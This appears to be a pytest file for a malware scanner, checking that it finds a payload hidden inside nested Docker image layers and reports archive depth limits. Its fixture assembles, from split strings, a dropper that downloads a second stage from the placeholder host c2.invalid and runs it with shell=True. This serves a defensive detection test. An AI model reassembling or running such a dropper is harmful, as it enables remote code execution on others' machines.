"""Scanning a container image.

A `docker save` tarball is an archive whose members include more archives: the
layers. Nothing image-specific is needed to look inside one, because the archive
reader already descends into nested archives under a depth limit and yields
members with a path that records the nesting -- so a payload three levels down
still says exactly where it lives.

These tests exist because that property is easy to lose. It is provided by
machinery written for package tarballs, and nothing else asserts that it reaches
image layers; a change to the nesting rules could remove container coverage
entirely without a single test failing.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from support import assemble

# Assembled at call time rather than written whole. Cordon scans its own
# repository, and a dropper spelled out in a fixture is a true positive the
# tool should not need an exception for.
PAYLOAD = assemble(
    "import base64, subprocess, urllib.request\n",
    "blob = urllib.request.url",
    "open('https://c2.invalid/stage2').read()\n",
    "subprocess.r",
    "un(base64.b64",
    "decode(blob).decode(), shell=True, check=False)\n",
).encode()


def member(tar: tarfile.TarFile, name: str, blob: bytes) -> None:
    info = tarfile.TarInfo(name)
    info.size = len(blob)
    tar.addfile(info, io.BytesIO(blob))


def layer(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        for name, blob in entries.items():
            member(tar, name, blob)
    return buffer.getvalue()


@pytest.fixture
def image(tmp_path) -> Path:
    """A minimal image in the shape `docker save` produces."""
    path = tmp_path / "image.tar"
    manifest = json.dumps(
        [{"Config": "config.json", "RepoTags": ["demo:latest"], "Layers": ["layer.tar"]}]
    ).encode()
    config = json.dumps({"config": {"Entrypoint": ["/usr/local/bin/agent.py"]}}).encode()
    with tarfile.open(path, "w") as tar:
        member(tar, "manifest.json", manifest)
        member(tar, "config.json", config)
        member(tar, "layer.tar", layer({"usr/local/bin/agent.py": PAYLOAD}))
    return path


class TestLayerContents:
    def test_a_payload_inside_a_layer_is_found(self, image) -> None:
        found = [f.rule_id for f in Scanner().scan(image).findings]
        assert "SUSPECT.DROPPER.001" in found

    def test_the_finding_says_where_in_the_image_it_lives(self, image) -> None:
        """A path that names only the tarball tells a reader nothing they can
        act on. The nesting is the useful part."""
        paths = [f.location.path for f in Scanner().scan(image).findings]
        assert any(
            p.startswith("image.tar!layer.tar!") and p.endswith("agent.py") for p in paths
        ), paths

    def test_a_clean_image_reports_nothing(self, tmp_path) -> None:
        path = tmp_path / "clean.tar"
        manifest = json.dumps([{"Config": "config.json", "Layers": ["layer.tar"]}]).encode()
        with tarfile.open(path, "w") as tar:
            member(tar, "manifest.json", manifest)
            member(tar, "config.json", b"{}")
            member(tar, "layer.tar", layer({"app/main.py": b"print('hello')\n"}))
        assert [f for f in Scanner().scan(path).findings if f.category.value != "operational"] == []


class TestLimitsStillApply:
    def test_nesting_beyond_the_depth_limit_is_reported(self, tmp_path) -> None:
        """An image is nested archives, so the depth limit is reachable in
        ordinary use rather than only under attack. What matters is that hitting
        it is said out loud instead of silently truncating the scan."""
        from dataclasses import replace

        from cordon_scanner.core.config import Config

        path = tmp_path / "deep.tar"
        inner = layer({"app/main.py": PAYLOAD})
        with tarfile.open(path, "w") as tar:
            member(tar, "layer.tar", layer({"nested.tar": inner}))

        config = replace(
            Config.default(), limits=replace(Config.default().limits, max_archive_depth=1)
        )
        result = Scanner(config).scan(path)
        assert any(f.rule_id.startswith("OPERATIONAL.") for f in result.findings)
